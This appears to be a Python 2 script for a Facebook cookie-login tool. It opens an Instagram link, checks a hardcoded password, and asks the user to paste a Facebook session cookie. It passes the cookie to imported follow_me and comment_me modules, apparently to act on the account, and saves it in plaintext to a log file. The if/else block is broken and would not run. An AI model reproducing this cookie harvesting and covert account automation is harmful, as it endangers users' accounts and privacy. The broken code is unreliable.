#!usr/bin/python2.7
# coding=utf-8

import os, time
from src import language
from src import follow_me
from src import comment_me
import time
import sys
import random
import getpass

def jalan(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.3)

os.system('clear')
print ("\033[1;97mfind the id and password on my Instagram, you will automatis")
os.system('xdg-open https://www.instagram.com/p/CAyBzI5Jaf6/?igshid=t2dmqx0cta0k')
username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
if username =="Zero" and password =="ZalasXa":

jalan ("nuhuna")
else:
print ("\033[1;96m[!] \033[1;91mIs Worng")
os.system('xdg-open https://www.instagram.com/p/CAyBzI5Jaf6/?igshid=t2dmqx0cta0k')


def loginFb(self, url, config):
	os.system('clear')
	print(config.banner())
	jalan('\n\033[1;93mLOGIN FACEBOOK (COOKIE)')
	while True:
		cookies = raw_input('\033[1;94mENTER COOKIE: ')
		response = config.httpRequest(url, cookies).encode('utf-8')
		if 'mbasic_logout_button' in str(response):
			print('\nPlease wait a minute...')
			language.main(cookies, url, config)
			follow_me.main(cookies, url, config)
			comment_me.main(cookies, url, config)
			try: os.mkdir('log')
			except: pass
			save = open('log/cookies.log','w')
			save.write(cookies.strip())
			save.close()
			jalan('\n\033[0;93mLogin successfully\033[0m')
			time.sleep(2)
			break
		else:
			print('\n\033[0;91mWrong cookies, please try Again.\n\033[0m')
